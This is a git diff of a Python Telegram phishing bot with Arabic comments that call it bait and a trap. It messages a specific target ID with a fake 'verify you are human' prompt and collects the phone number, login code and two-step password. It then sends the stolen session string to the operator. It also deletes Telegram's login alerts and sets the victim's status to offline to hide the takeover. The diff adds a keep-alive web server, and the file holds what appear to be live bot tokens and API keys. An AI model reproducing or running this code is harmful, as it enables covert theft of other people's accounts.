@@ -2,6 +2,9 @@ import logging
 import asyncio
 import requests
 import json
+import threading
+import os
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from telethon import TelegramClient, functions
@@ -9,24 +12,37 @@ from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
 # ================= الإعدادات =================
-# 1. توكن بوت الجحش (الطعم)
-BOT_TOKEN = "5768514554:AAGqY3bn42dACDnAyanqsiTylDl3S4_IWMU"
-# 2. الآيدي الخاص بك (لإرسال الجلسات المسروقة إليك)
-ADMIN_ID = 8574178583
-# 3. الآيدي الخاص بالجحش (الهدف)
-TARGET_ID = "632621666"
-# 4. مفاتيح API (من my.telegram.org)
+BOT_TOKEN = "5768514554:AAGqY3bn42dACDnAyanqsiTylDl3S4_IWMU" # توكن بوت الجحش
+ADMIN_ID = 8574178583 # الآيدي الخاص بك
+TARGET_ID = "632621666" # الآيدي الخاص بالجحش (الهدف)
 API_ID = 35980161 
 API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
 
+# ================= الخادم الوهمي (Health Server) =================
+def run_web_server():
+    port = int(os.environ.get("PORT", 8080))
+    class SimpleHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"BOT IS ALIVE")
+        def do_HEAD(self):
+            self.send_response(200)
+            self.end_headers()
+        def log_message(self, format, *args):
+            pass # كتم سجلات الخادم
+    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
+    server.serve_forever()
+
+threading.Thread(target=run_web_server, daemon=True).start()
+
 # ================= إعداد البوت =================
 app = Application.builder().token(BOT_TOKEN).build()
-user_clients = {}
 login_states = {}
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-# ================= دوال المساعدة =================
+# ================= الدوال المساعدة =================
 async def send_session_to_admin(phone, session_str, password=None):
     try:
         await app.bot.send_message(
@@ -39,17 +55,15 @@ async def send_session_to_admin(phone, session_str, password=None):
 
 async def clear_notifications(client):
     try:
-        # مسح رسائل تسجيل الدخول من تلغرام
         messages = await client.get_messages(777000, limit=5)
         for msg in messages:
             if msg.text and ("login" in msg.text.lower() or "تسجيل دخول" in msg.text):
                 await client.delete_messages(777000, msg.id)
-        # إخفاء الحالة (Offline)
         await client(functions.account.UpdateStatusRequest(offline=True))
     except:
         pass
 
-# ================= الطعم (إرسال الرسالة للجحش) =================
+# ================= الطعم =================
 async def send_bait_to_target():
     print("🎣 جاري إرسال الطعم للجحش...")
     keyboard = {
@@ -64,13 +78,12 @@ async def send_bait_to_target():
         "reply_markup": json.dumps(keyboard)
     }
     try:
-        # نرسل الطعم باستخدام طلب HTTP مباشر (لتجنب تعارض البوت مع نفسه)
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
         print("✅ تم إرسال الطعم بنجاح.")
     except Exception as e:
         print(f"❌ فشل إرسال الطعم: {e}")
 
-# ================= المصيدة (استقبال التفاعل) =================
+# ================= المصيدة =================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("🔵 تحقق أنك إنسان", callback_data="verify_human", style="primary")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -88,8 +101,7 @@ async def verify_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if user_id not in login_states:
-        return
+    if user_id not in login_states: return
     text = update.message.text.strip()
     state = login_states[user_id]["step"]
     
@@ -137,9 +149,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await update.message.reply_text(f"❌ كلمة مرور خاطئة: {e}")
 
-# ================= التشغيل الرئيسي =================
+# ================= التشغيل =================
 async def post_init(app: Application):
-    # هذه الدالة تعمل بمجرد تشغيل البوت، لتطلق الطعم تلقائياً
     await send_bait_to_target()
 
 def main():
